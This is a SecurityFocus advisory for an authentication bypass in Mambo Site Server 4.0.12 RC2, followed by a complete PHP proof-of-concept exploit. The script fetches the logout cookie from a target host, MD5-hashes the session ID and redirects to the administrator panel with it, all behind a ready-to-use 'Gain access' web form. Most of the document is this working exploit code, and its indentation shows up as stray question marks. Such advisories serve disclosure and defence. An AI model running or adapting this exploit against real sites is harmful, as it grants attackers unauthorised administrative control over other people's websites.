source: http://www.securityfocus.com/bid/6926/info

Mambo Site Server may grant access without sufficiently validating cookie based authentication credentials. It has been reported that Mambo will accept a user cookie sent by the site as an administrative credential. To exploit this issue, the attacker must receive a cookie (such as the one issued during logout) and then use MD5 to encode their session ID in the cookie. The attacker may then access administrative pages using this cookie.

This issue was reported in Mambo Site Server 4.0.12 RC2. Earlier versions may also be affected. 

<?php 
/* 
???mamboexp.php - Mambo 4.0.12 RC2 exploit - Proof of concept 
???Copyright (C) 2003??Simen Bergo (sbergo@thesource.no) 
???This program is free software; you can redistribute it and/or 
???modify it under the terms of the GNU General Public License 
???as published by the Free Software Foundation; either version 2 of 
???the License or (at your option) any later version. 
???This program is distributed in the hope that it will be 
???useful, but WITHOUT ANY WARRANTY; without even the implied warranty 
???of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.??See the 
???GNU General Public License for more details. 
???You should have received a copy of the GNU General Public License 
???along with this program; if not, write to the Free Software 
???Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA??02111-1307, USA. 
*/ 
/* 
???The problem is that Mambo Site Server does not check whether or not 
???the sessionid is created by the administrator login, or any other 
???part of the website. 
???This program will first connect to /index.php?option=logout which 
???hands us a cookie. Then we will md5() encrypt this cookie and "login" 
???at the administrator section. 
*/ 
???? 
????# Check if form was submitted 
????if (isset ($_POST['submit'])) { 
????????# Connect to server 
????????$handle = fsockopen ($_POST['hostname'], 80, &$errno, &$errstr); 
????????# Halt processing if we we're unable to connect 
????????if (!$handle) { die ("Unable to connect to <b>$hostname</b>"); } 
????????else { 
????????????# Get the webpage which will give us the cookie 
????????????fputs ($handle, "GET /" . trim($_POST['maindir'], "\x5c \x2f") . "/index.php?option=logout HTTP/1.0\nHost: 
{$_POST['hostname']}\n\n"); 
????????????# Loop through the contents 
????????????$buffer = ""; 
????????????while (!feof ($handle)) { 
????????????????$buffer .= fgets ($handle, 2000); 
????????????} 
????????????# Create an array with each line as a seperate value 
????????????$arr = explode ("\n", $buffer); 
????????????# Loop through the array looking for the cookie 
????????????foreach ($arr as $value) { 
????????????????# If we have found the cookie, proceed 
????????????????if (eregi ("Set-Cookie: sessioncookie=", $value)) { 
????????????????????# Explode again, to sort out the sessionid 
????????????????????$var = explode ("=", $value); 
????????????????????# Now that we have all the information we need, we can redirect 
????????????????????header ("Location: http://{$_POST['hostname']}/" . 
???????????????????????????? trim($_POST['admdir'], "\x5c \x2f") . "/index2.php?session_id=" . md5(trim($var[1]))); 
????????????????} 
????????????} 
????????} 
????} 
?> 
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST"> 
??<table border="0" cellspacing="0" cellpadding="0"> 
????<tr> 
??????<td width="120" height="30">Hostname</td> 
??????<td width="280" height="30"><input type="text" name="hostname" size="30" value="www.mamboserver.com"/></td> 
????</tr> 
????<tr> 
??????<td width="120" height="30">Main directory</td> 
??????<td width="280" height="30"><input type="text" name="maindir" size="30" value=""/></td> 
????</tr> 
????<tr> 
??????<td width="120" height="30">Admin directory</td> 
??????<td width="280" height="30"><input type="text" name="admdir" size="30" value="administrator"/></td> 
????</tr> 
????<tr> 
??????<td width="120" height="30"></td> 
??????<td width="280" height="30"><input type="submit" value="Gain access" name="submit"/> <input type="reset" 
value="Reset"/></td> 
????</tr> 
??</table> 
</form>
